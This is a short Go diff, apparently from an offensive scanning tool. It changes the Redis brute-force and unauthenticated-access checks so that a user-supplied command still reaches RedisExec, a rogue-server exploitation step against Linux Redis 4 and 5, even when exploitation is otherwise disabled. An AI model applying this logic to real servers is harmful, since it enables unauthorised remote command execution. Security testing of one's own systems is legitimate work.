@@ -72,7 +72,7 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 			}
 			info.Queue.Push(vuln)
 		}
-		if info.DisableExp {
+		if info.DisableExp && info.Command == "" {
 			return
 		}
 		dbfilename, dir, err = getconfig(conn)
@@ -89,7 +89,11 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 		}
 		if strings.Contains(reply, "\nredis_version:5") || strings.Contains(reply, "\nredis_version:4") {
 			if strings.Contains(reply, "\nos:Linux") {
-				RedisExec(conn, info.RedisRogueServer, info.Command.TCPCommand)
+				if !info.DisableExp {
+					RedisExec(conn, info.RedisRogueServer, info.Commands.TCPCommand)
+				} else {
+					RedisExec(conn, info.RedisRogueServer, info.Command)
+				}
 			}
 		}
 	}
@@ -131,7 +135,7 @@ func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 			}
 			info.Queue.Push(vuln)
 		}
-		if info.DisableExp {
+		if info.DisableExp && info.Command == "" {
 			return
 		}
 		dbfilename, dir, err = getconfig(conn)
@@ -140,7 +144,11 @@ func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 		}
 		if strings.Contains(reply, "\nredis_version:5") || strings.Contains(reply, "\nredis_version:4") {
 			if strings.Contains(reply, "\nos:Linux") {
-				RedisExec(conn, info.RedisRogueServer, info.Command.TCPCommand)
+				if !info.DisableExp {
+					RedisExec(conn, info.RedisRogueServer, info.Commands.TCPCommand)
+				} else {
+					RedisExec(conn, info.RedisRogueServer, info.Command)
+				}
 			}
 		}
 	}
